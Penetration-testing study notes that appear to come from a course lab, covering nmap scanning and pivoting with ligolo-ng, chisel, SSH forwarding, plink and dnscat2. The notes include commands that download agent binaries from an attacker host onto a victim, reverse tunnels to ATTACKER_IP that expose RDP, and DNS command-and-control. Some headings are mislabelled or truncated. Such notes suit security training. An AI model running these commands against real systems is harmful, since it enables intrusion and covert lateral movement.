

## Nmap  
 
If using scripts, you can get script help by `nmap --script-help="nfs-*"`.

```sh
#If we want to target one ip, the following process
nmap -Pn -v -sV -sC -oN nmap.initial 192.
nmap -Pn -v -sV -sC -p- -oN nmap.allports 192.
nmap -p 161,162,10161,10162 -sU 192.168.169.220 

#NETWORK SWEEP:
nmapallports -iL ips.txt

nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2 > upips.txt
```

## Options

```shell

-Pn   skip host discovery - this allows for communication directly with the ports without sending packets to 80,443 to verify if the host is up.

##(provides service, and reason)
-vvv verbose

#(provides service, version)
-sV for versioning

-O os detection --ossscan- guess aggresive
-sT TCP connect port scan (Default without root privilege)
-p- for all ports
-sU for udp
-sn (network sweep)
-oG save to greppable file
-sC default NSE scripts
-A os detection, version detection. Traceroute, script sacnning
--open (only show open)

```
## NSE


```sh

#We can find scripts in this folder
cd /usr/share/nmap/scripts/

#If we want to download an NSE script for a vuln
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
sudo nmap --script-updatedb

# specifying safe and wildcard ftp-* scripts
# logic: and, or, not all work. "," is like "or"
nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP

# to get help on scripts:
nmap --script-help="ftp-*"

#We can also grep the TYPE of script we want and use it like so

cat script.db  | grep "\"vuln\""

sudo nmap --script "vuln" 192.168.xx.xx

#give details about the script
nmap --script-help=clamav-exec.nse

```


## Windows Port Scanning

This is a way to live off the land in Windows and perform a port scan.

```powershell
# perform full TCP connection to test if port open
Test-NetConnection -Port 445 $VICTIM_IP

# scanning multiple ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null

# limited ports to search
22,25,80,135,139,445,1443,3306,3389,5432 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null
```












# IGOL-NG

Use this guide:
https://4pfsec.com/ligolo

```shell
#windows
Invoke-WebRequest -Uri 192.168.45.230/windowsprivesc/ligoagent.exe -OutFile agent.exe
certutil -f -split -urlcache http://192.168.49.106/windowsprivesc/ligoagent.exe agent.exe

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert
./agent -connect 192.168.49.106:11601 -ignore-cert

#add a route
sudo ip route add 172.16.237.0/24 dev ligolo

#remove a route 
sudo ip route del 172.16.237.0/24 dev ligolo

#MONITOR connection
IP="172.16.106.100"; PORT=445; TIMEOUT=5;SLEEP=20;while true; do echo "================================="; date;timeout $TIMEOUT nc -nvz $IP $PORT || echo -e "no connection to $IP $PORT";sleep $SLEEP;done
```

# Bending with chisel


```bash
# on attack box
# start reverse socks proxy server on port 8080:
./chiselserver server -p 8000 --reverse

# on jumpbox (Windows example), set up reverse SOCKS proxy
.\chisel-x64.exe client attacker_ip:8295 R:80:VICTIM_IP:8295

./chiselserver server -p 443 --reverse
./chisel  client 192.168.45.230:443 R:80:127.0.0.1:80

```


# ssh

```ini
After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.

```bash
# all commands executed as ROOT

# View the SSH server status.
systemctl status ssh

# Restart the SSH server (Debian, Ubuntu, Mint)
systemctl restart ssh # newer systemd systems

# Stop the SSH server.
systemctl stop ssh

# Start the SSH server.
systemctl start ssh
```


### Local Port Forward 

Set up using OpenSSH's **-L** option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.

In this case, we will instruct SSH to listen on all interfaces on port **4455** on CONFLUENCE01 (**0.0.0.0:4455**), then forward all packets (through the SSH tunnel to PGDATABASE01) to port **445** on the newly-found host (**172.16.50.217:445**).

We're listening on port 4455 on CONFLUENCE01 because we're running as the _confluence_ user: we don't have the permissions to listen on any port below 1024.

Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using **ssh**, logging in as _database_admin_. We'll pass the local port forwarding argument we just put together to **-L**, and use **-N** to prevent a shell from being opened.

```shell
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

Once we've entered the password, we don't receive any output. When running SSH with the **-N** flag, this is normal. The **-N** flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.


### Remote Port Forward

We can ensure that we're in a TTY shell using Python3's _pty_ module. We will create our SSH connection to PGDATABASE01 using the _database_admin_ credentials again. In OpenSSH, a dynamic port forward is created with the **-D** option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port **9999**. We don't have to specify a socket address to forward to. We'll also pass the **-N** flag to prevent a shell from being spawned.

```shell
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

  
Let's try Proxychains with smbclient. Proxychains uses a configuration file for almost everything, stored by default at **/etc/proxychains4.conf**. We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy (rather than any other kind of proxy). By default, proxies are defined at the end of the file. We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on CONFLUENCE01 (**socks5 192.168.50.63 9999**).

```shell
kali@kali:~$ tail /etc/proxychains4.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

Next, we can simply prepend **proxychains** to the command. Proxychains will read the configuration file, hook into the smbclient process, and force all traffic through the SOCKS proxy we specified.

```shell
proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.50.217
```

### Remote Port Forwarding

In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.
The SSH remote port forward option is **-R**, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.

In this case, we want to listen on port **2345** on our Kali machine (**127.0.0.1:2345**), and forward all traffic to the PostgreSQL port on PGDATABASE01 (**10.4.50.215:5432**).

```shell
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

We can now start probing port 2345 on the loopback interface of our Kali machine, as though we're probing the PostgreSQL database port on PGDATABASE01 directly. On our Kali machine, we will use **psql**, passing **127.0.0.1** as the host (**-h**), **2345** as the port (**-p**), and using the database credentials of the **postgres** user (**-U**) we found earlier on CONFLUENCE01.

```shell
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding

The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same **-R** option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply specify **-R 443** to the SSH command we run on CONFLUENCE01. We'll also pass the **-N** flag to prevent a shell from being opened.

```shell
ssh -N -R 443 kali@192.168.45.193
```

ust as we did in the classic dynamic port forwarding example, we can use Proxychains to tunnel traffic over this SOCKS proxy port. We'll edit our Proxychains configuration file at **/etc/proxychains4.conf** on our Kali machine to reflect our new local SOCKS proxy port.

```shell
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 443
```

We can then run **nmap** with **proxychains** as we did before, this time against MULTISERVER03.

```shell
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

###  SSH on Windows

SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.

```powershell
# check if SSH is on Windows
where ssh.exe

# check if version >= 7.6, so we can use Reverse Dynamic forwarding
ssh.exe -V
```

The other option is to copy **`plink.exe`** over to the Windows box.

> ⚠ **NOTE:** If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!

```sh
# grab copy of plink and host on http for Windows victim
cp /usr/share/windows-resources/binaries/plink.exe .
python -m http.server 80

# on windows, download it
iwr http://LISTEN_IP/plink.exe -outfile C:\Windows\Temp\plink.exe

# use plink similar to ssh, with addition of '-l USER -pw PASSWD'
# Note: echo y accepts host key on non-interactive shells.
# This command opens up the victim's firewalled RDP to your kali box.
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP
```


## Bending with `dnscat2`

[Dnscat2](https://github.com/iagox86/dnscat2) is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.

```sh
# on your DNS Nameserver, start the dnscat2 server:
dnscat2-server mydomain.com

# on your victim, start the dnscat2 client
./dnscat mydomain.com


# on your DNS Nameserver, in the dnscat2 command shell:
# list active sessions (windows)
dnscat2> windows
# interact with window/session 1
dnscat2> window -i 1
# get help, listing all commands
command (victim01) 1> ? # or 'help'
# get command help for 'listen' (sets up local fwd like ssh -L)
command (victim01) 1> listen --help
# start local port forwarding
command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
# if you mess up and have to change the listening port,
# you have to kill the client and restart it.
# It's usually better to just pick a different listen port if you can.
# return to main command screen
command (victim01) 1> shutdown
# (after restarting victim client, you can retry your port forward)
# if you want to return to the top level command window
# without killing the client:
command (victim01) 1> suspend


# on kali:
# now you can use your newly forwarded port to reach inside the victim network:
smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
# connection will be very slow.
```